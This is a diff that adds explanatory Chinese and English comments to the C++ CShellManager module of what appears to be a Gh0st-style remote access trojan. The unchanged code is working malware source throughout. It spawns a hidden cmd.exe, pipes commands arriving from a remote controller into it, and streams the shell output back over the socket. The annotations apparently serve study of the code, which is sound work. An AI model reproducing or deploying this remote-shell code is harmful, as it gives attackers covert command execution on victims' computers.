@@ -23,15 +23,23 @@ CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
     sa.lpSecurityDescriptor = NULL; 
     sa.bInheritHandle = TRUE;
 
-	
-    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
+/*	
+BOOL WINAPI CreatePipe(
+  _Out_    PHANDLE               hReadPipe,
+  _Out_    PHANDLE               hWritePipe,
+  _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
+  _In_     DWORD                 nSize
+);
+*/
+    // Create 2 pipes.
+    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0)) // cmd 結果 -> server app 
 	{
 		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
 		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
 		return;
     }
 
-    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
+    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) // (client command ->)server command -> cmd
 	{
 		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
 		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
@@ -41,9 +49,10 @@ CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
 	memset((void *)&si, 0, sizeof(si));
     memset((void *)&pi, 0, sizeof(pi));
 
-	GetStartupInfo(&si);
+
+	GetStartupInfo(&si);// 獲得該prcoess屬性給即將create的cmd process
 	si.cb = sizeof(STARTUPINFO);
-    si.wShowWindow = SW_HIDE;
+    si.wShowWindow = SW_HIDE; // 隱藏視窗
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     si.hStdInput  = m_hReadPipeShell;
     si.hStdOutput = si.hStdError = m_hWritePipeShell; 
@@ -51,6 +60,7 @@ CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
 	GetSystemDirectory(strShellPath, MAX_PATH);
 	strcat(strShellPath,"\\cmd.exe");
 
+	// Create cmd process
 	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
 		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
 	{
@@ -64,9 +74,13 @@ CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
 	m_hThreadHandle	= pi.hThread;
 
 	BYTE	bToken = TOKEN_SHELL_START;
+	// 告訴 client 準備完成
 	Send((LPBYTE)&bToken, 1);
 	WaitForDialogOpen();
+	// 開 2 個 threads
+	// 讀 pipe 內容
 	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
+	// 等 pipe 關閉
 	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
 }
 
@@ -98,6 +112,8 @@ CShellManager::~CShellManager()
     CloseHandle(m_hThreadRead);
 }
 
+// Implementation of OnReceive
+// 讓 server 端可以收 client 端訊息並傳到 pipe 裡給 cmd
 void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
 	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
@@ -107,9 +123,10 @@ void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	}
 	
 	unsigned long	ByteWrite;
+	// 將從server收到的訊息傳給pipe
 	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
 }
-
+// 讀 pipe 內容 並傳回 client 的 thread
 DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
 {
 	unsigned long   BytesRead = 0;
@@ -119,14 +136,18 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
 	while (1)
 	{
 		Sleep(100);
+		// Peek 一下，Pipe 有東西則 True
+		// 沒東西就會一直sleep直到有東西再進這個whie loop
 		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
 		{
 			if (BytesRead <= 0)
-				break;
+				break; //cmd.exe已經關掉
 			memset(ReadBuff, 0, sizeof(ReadBuff));
 			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
+
+			// 讀取 Pipe 內訊息
 			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
-			// ��������
+			// 再傳到 主控端 那裡 
 			pThis->Send(lpBuffer, BytesRead);
 			LocalFree(lpBuffer);
 		}
